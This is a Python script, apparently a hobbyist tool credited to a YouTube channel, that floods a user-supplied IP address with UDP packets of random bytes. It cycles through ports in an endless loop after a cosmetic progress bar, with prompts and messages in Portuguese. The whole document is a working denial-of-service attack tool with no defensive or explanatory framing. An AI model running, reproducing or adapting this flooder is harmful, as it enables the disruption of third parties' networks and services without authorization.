ENORMITY - DOS

#-*- coding: utf-8 -*-
try:
    from time import sleep
    import os
    import socket
    import random
    import sys
except KeyboardInterrupt:
    print("Você escolheu sair, obrigado!")
    sys.exit()


sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

r = "\033[1;31m"
c = "\033[1;36m"
y = "\033[1;33m"

os.system("clear")

print()
print(r+"""
ATTACK - DOS
 *
  * * *
   *
     * *
   * *
       *
**

  *
    versão: V1.0
  youtube channel: Zeus Xaloc
Powered by: ENORMITY \n\n""")
try:
    ip = input(c+"IP >>: ")
    port = int(input(c+"Porta >>: "))
except KeyboardInterrupt:
    print(r+"Você escolheu sair, obrigado!")
    sys.exit()

os.system("clear")
print(y+"[                    ] 0%")
sleep(1)
os.system("clear")
print(y+"[=====               ] 25%")
sleep(1)
os.system("clear")
print(y+"[==========          ] 50%")
sleep(1)
os.system("clear")
print(y+"[===============     ] 75%")
sleep(1)
os.system("clear")
print(y+"[====================] 100%")
sleep(3)
os.system("clear")
sent = 0


while True:
    sock.sendto(bytes, (ip,port))
    sent = sent + 1
    port = port + 1
    print (r+"[•]%s ATACANDO %s PARA CANCELAR ^C %s <<<>>>"%(sent,ip,port))


    if port == 65535:
        port = 1

try:
    print (r+"[•]%s ATACANDO %s PARA CANCELAR ^C %s <<<>>>"%(sent,ip,port))
except KeyboardInterrupt:
    print(r+"Você escolheu sair, obrigado!")
    sys.exit()
